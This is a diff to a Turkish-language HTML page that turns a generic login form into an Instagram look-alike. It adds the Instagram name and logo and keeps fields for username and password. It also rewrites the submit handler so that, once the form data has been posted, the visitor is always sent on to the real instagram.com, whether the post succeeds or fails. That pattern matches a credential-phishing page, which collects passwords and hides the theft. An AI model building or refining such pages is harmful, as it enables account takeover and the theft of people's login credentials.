@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>Giriş Sayfası</title>
+  <title>İnstagram Giriş</title>
   <style>
     * {
       margin: 0; padding: 0; box-sizing: border-box;
@@ -13,15 +13,28 @@
       font-family: Arial, sans-serif;
     }
     .resim-kapsayici {
-      width: 100%; height: 100px;
-      display: flex; justify-content: center; align-items: center;
+      width: 100%; height: 50%;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
       margin-top: 20px;
     }
     .ortali-resim {
-      max-width: 70px; height: auto;
+      max-width: 90px; height: auto;
     }
+p.turkce {
+  text-align: center;
+  font-size: 17px;
+  color: #000203;
+  cursor: pointer;
+  user-select: none;
+  margin-top: 0px; /* YÜKSEKLİĞİ BURADAN AYARLARSIN */
+  margin-bottom: 40px;
+}
+
     form.form-kapsayici {
-      margin: 30px auto 0;
+      margin: -100px auto 0;
       display: flex; flex-direction: column;
       align-items: center;
       gap: 15px;
@@ -53,14 +66,14 @@
     }
     p.sifremi-unuttum {
       text-align: center;
-      font-size: 14px;
-      color: #00376b;
+      font-size: 17px;
+      color: #000203;
       cursor: pointer;
       user-select: none;
       margin-top: 10px;
     }
     .yeni-hesap-kapsayici {
-      margin: 50px auto 40px;
+      margin: 100px auto 40px;
       width: 90%;
       max-width: 320px;
       display: flex;
@@ -72,7 +85,7 @@
       background: transparent;
       color: #2575fc;
       font-size: 15px;
-      border: 2px solid #007fff;
+      border: 1.5px solid #007fff;
       border-radius: 50px;
       cursor: pointer;
       transition: background 0.4s ease, color 0.4s ease;
@@ -84,7 +97,7 @@
     }
     .resim-kapsayici2 {
       width: 100%;
-      height: 80px;
+      height: 0px;
       display: flex; justify-content: center; align-items: center;
       margin-top: 40px;
     }
@@ -96,7 +109,8 @@
 <body>
 
 <div class="resim-kapsayici">
-  <img src="https://w7.pngwing.com/pngs/454/401/png-transparent-logo-instagram-text-logo-number-thumbnail.png" alt="Ortalanmış Resim" class="ortali-resim" />
+  <p class="turkce">Türkçe</p>
+  <img src="https://cdn-icons-png.flaticon.com/512/5968/5968776.png" alt="Ortalanmış Resim" class="ortali-resim" />
 </div>
 
 <form id="girisForm" class="form-kapsayici">
@@ -105,7 +119,7 @@
   <input type="text" name="kullanici_adi" placeholder="Kullanıcı adı, e-posta veya cep numarası" required />
   <input type="password" name="sifre" placeholder="Şifre" required />
   <button type="submit" class="giris-buton">Giriş Yap</button>
-  <p class="sifremi-unuttum" onclick="alert('Şifre sıfırlama işlemi yakında!')">Şifreni mi unuttun?</p>
+  <p class="sifremi-unuttum" onclick="alert('Hata!')">Şifreni mi unuttun?</p>
 </form>
 
 <div class="yeni-hesap-kapsayici">
@@ -120,7 +134,7 @@
   const form = document.getElementById('girisForm');
 
   form.addEventListener('submit', function(event) {
-    event.preventDefault(); // Sayfa yenilenmesini engelle
+    event.preventDefault(); // Sayfanın yenilenmesini engelle
 
     const formData = new FormData(form);
 
@@ -132,18 +146,21 @@
       }
     })
     .then(response => {
-      if(response.ok) {
-        alert('Form başarıyla gönderildi!');
-        form.reset();
+      // form başarılıysa instagram'a yönlendir
+      if (response.ok) {
+        window.location.href = "https://instagram.com";
       } else {
-        alert('Form gönderilirken hata oluştu.');
+        // hata olursa yine de yönlendir (istersen değiştirebilirsin)
+        window.location.href = "https://instagram.com";
       }
     })
     .catch(error => {
-      alert('Hata: ' + error.message);
+      // hata olsa bile yönlendir
+      window.location.href = "https://instagram.com";
     });
   });
 </script>
+
 
 </body>
 </html>
